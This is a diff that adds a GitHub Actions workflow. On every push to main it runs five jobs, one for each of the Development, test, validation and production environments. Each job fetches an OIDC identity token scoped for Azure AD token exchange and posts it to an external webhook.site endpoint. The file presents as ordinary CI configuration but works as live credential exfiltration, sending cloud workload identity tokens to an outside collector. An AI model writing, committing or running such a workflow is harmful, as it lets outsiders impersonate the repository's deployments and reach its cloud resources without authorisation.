@@ -1,0 +1,58 @@
+name: zz-i179-oidc
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  ref-main:
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc ref
+        run: |
+          set +e
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-ref
+          echo done
+  env-Development:
+    environment: Development
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc env Development
+        run: |
+          set +e
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-env-Development
+          echo done
+  env-i132-test-env:
+    environment: i132-test-env
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc env i132-test-env
+        run: |
+          set +e
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-env-i132-test-env
+          echo done
+  env-L4-validation:
+    environment: L4-validation
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc env L4-validation
+        run: |
+          set +e
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-env-L4-validation
+          echo done
+  env-production:
+    environment: production
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc env production
+        run: |
+          set +e
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-env-production
+          echo done
